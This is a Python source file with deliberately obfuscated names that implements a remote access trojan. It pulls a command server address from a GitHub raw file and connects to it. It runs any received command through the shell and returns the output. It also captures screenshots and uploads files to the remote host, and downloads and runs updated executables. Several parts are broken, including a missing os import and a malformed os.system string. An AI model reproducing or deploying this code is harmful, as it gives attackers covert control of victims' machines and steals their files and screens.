import sys,subprocess,socket,time,requests
from PIL import ImageGrab
PBlfkOQNBhBYNSHgw = "1.29.11.24"
MCFZmKsYoLbaqinh = ""
ApNiRChxDCYqIUUZmpAO = ""
XhiZgQIZwGMJmaRizcca = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
yYIIKYLrDohqVb = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
HDNFcAuooCGSfotIvjZkH = "!"

def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def mfgjHePqjjLrNiDXfsOEYTE(s):
	keNzDxhOKdK = s.recv(1024)
	if len(keNzDxhOKdK)==0:
		return True
	ouYJTJtbMBxVgBOHfTQcUPh = keNzDxhOKdK.decode("utf-8")
	if not ouYJTJtbMBxVgBOHfTQcUPh.startswith(HDNFcAuooCGSfotIvjZkH):
		proc = subprocess.run(keNzDxhOKdK.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	jomKMCQzLEGGQYBpeqifY = ouYJTJtbMBxVgBOHfTQcUPh.split(" ")[0][1:]
	if jomKMCQzLEGGQYBpeqifY == "download":
		kdoeiKnUyUonlf(s, ouYJTJtbMBxVgBOHfTQcUPh)
	elif jomKMCQzLEGGQYBpeqifY == "screenshot":
		OZrqjwlKIE(s)

def kdoeiKnUyUonlf(s, ouYJTJtbMBxVgBOHfTQcUPh):
	XkWEGFVjfgekvRDTu = ouYJTJtbMBxVgBOHfTQcUPh.replace(HDNFcAuooCGSfotIvjZkH+"screenshot ", "").split(",")
	results = []
	for f in XkWEGFVjfgekvRDTu:
		results += IIkGcNPUBOgOaGVfBfCA(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))

def OZrqjwlKIE(ouYJTJtbMBxVgBOHfTQcUPh):
	RfCOdSNth = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	RfCOdSNth.save(fpath)
	RfCOdSNth.close()
	r = IIkGcNPUBOgOaGVfBfCA(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)

def IIkGcNPUBOgOaGVfBfCA(WPWZaSSSXKBrj, XbYRrrpbZJSjmxmcFqzDMSA, MdUrqgfcpU=None):
	if not os.path.exists(WPWZaSSSXKBrj):
		return "FILE NOT FOUND: "+WPWZaSSSXKBrj
	headers = {"user":os.getlogin()}
	if MdUrqgfcpU is not None:
		headers = {**headers, **MdUrqgfcpU}
	requests.post(MCFZmKsYoLbaqinh+":"+ApNiRChxDCYqIUUZmpAO+"/"+XbYRrrpbZJSjmxmcFqzDMSA,
		files={open(WPWZaSSSXKBrj, "rb")},
		headers=headers)
	return "SUCCESS"

def tRZslzq():
	if MCFZmKsYoLbaqinh == "" or ApNiRChxDCYqIUUZmpAO == "":
		keNzDxhOKdK = requests.get(XhiZgQIZwGMJmaRizcca).text.replace("\n","").split(":")
		MCFZmKsYoLbaqinh = keNzDxhOKdK[0].strip()
		ApNiRChxDCYqIUUZmpAO = keNzDxhOKdK[1].strip()
		qMRSJCpBovCOUSfnMG = keNzDxhOKdK[2].strip()
	return MCFZmKsYoLbaqinh, ApNiRChxDCYqIUUZmpAO, qMRSJCpBovCOUSfnMG

def NXMlOzFhEsPSQN():
	mNkJJjDHggcbK = os.path.basename(__file__)
	fileType = mNkJJjDHggcbK.split(".")[-1]
	bEZLlcWsJTySIpDpASFIs = mNkJJjDHggcbK.replace(fileType,"") +"."+PBlfkOQNBhBYNSHgw + fileType
	LHcZzsSgDHhzwsbPd = os.path.join(os.path.getcwd(), bEZLlcWsJTySIpDpASFIs)
	with open(bEZLlcWsJTySIpDpASFIs, "wb+") as f:
		f.write(requests.get(yYIIKYLrDohqVb+"/file"+LHcZzsSgDHhzwsbPd.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+LHcZzsSgDHhzwsbPd)
	elif fileType == ".pyw":
		os.system("python "+LHcZzsSgDHhzwsbPd")

def fggFbOewFrVmiINkrXvsKS():
	pass

def OlaDhsUieswyAJUCTXS():
	h, p, v = tRZslzq()
	if PBlfkOQNBhBYNSHgw != v:
		NXMlOzFhEsPSQN()
	fggFbOewFrVmiINkrXvsKS()
	while True:
		try:
			while True:
				YSZPmZyankEFjZQnJXphg=False
				try:
					s=connect(h, p)
					while not YSZPmZyankEFjZQnJXphg:
						s.send(b"\n>> ")
						YSZPmZyankEFjZQnJXphg=mfgjHePqjjLrNiDXfsOEYTE(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(OlaDhsUieswyAJUCTXS())
